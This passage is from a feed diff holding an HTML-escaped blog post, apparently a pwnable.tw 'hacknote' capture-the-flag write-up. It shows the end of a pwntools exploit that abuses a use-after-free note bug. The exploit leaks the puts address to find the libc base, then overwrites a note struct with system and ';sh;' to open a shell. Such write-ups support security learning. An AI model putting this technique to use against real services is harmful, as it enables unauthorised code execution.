+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;delete_note&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(index):
+    r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Index :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(index))
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Success&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    skip_menu()
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;skip_menu&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;----------------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;----------------------&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+    r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;----------------------&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Leak libc
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;add_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;a&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+add_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;a&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+delete_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+delete_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+add_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;A&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# This overwrites the note struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;add_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, p32(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ADDR_PRINT_FUNC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p32(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ADDR_PUTS_GOT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Index :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u32(r.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_ADDR &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;L_ADDR_PUTS
+ADDR_SYSTEM &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;L_ADDR_SYSTEM
+ADDR_BINSH &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc.search(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;bin&#x2F;sh&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;).next()
+
+log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Leaked address of puts [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;]&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_ADDR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)))
+log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found libc base [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;]&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)))
+log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found address of system [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;]&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ADDR_SYSTEM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)))
+log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found address of &amp;#39;&#x2F;bin&#x2F;sh&amp;#39; [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;]&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ADDR_BINSH&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)))
+
+delete_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;#Create shell
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;log.info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Attempting to create shell&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+add_note(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, p32(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;ADDR_SYSTEM&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;;sh;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Index :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+r.write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+r.interactive()
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-hacknote&#x2F;5d07ec98508cb0091260f637.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+</feed>
